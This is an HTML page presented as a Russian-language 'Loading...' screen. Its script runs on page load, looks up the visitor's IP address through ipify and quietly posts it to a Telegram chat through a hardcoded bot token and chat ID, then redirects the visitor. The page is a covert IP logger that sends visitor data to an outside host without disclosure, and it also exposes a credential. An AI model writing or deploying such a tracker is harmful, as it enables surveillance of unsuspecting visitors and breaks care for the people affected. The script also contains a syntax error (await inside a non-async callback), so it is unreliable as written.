<!DOCTYPE html>
<html>
    <head>
        <title>Загрузка...</title>
        <meta charset="UTF-8">
    </head>
    <script>
        let Log = "";

        const Token = '7961362245:AAEhXP1-rY8Dbtje2ZODTkBchfwvjib37JI';
        const chatId = '7339807316';
        const url = `https://api.telegram.org/bot${Token}/sendMessage`;

        window.onload = async function() {
            Log += `Новое посещение\n`;

            fetch('https://api.ipify.org?format=json')
                .then(response => response.json() )
                .then(data => {
                    Log += data.ip;

                    const response = await fetch(url, {
                        method:'POST',
                        headers: {
                            'Content-Type':'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: Log
                        })
                    });

                    if (response.ok === true) {
                        location.href = '/';
                    }
                });
        }
    </script>
</html>
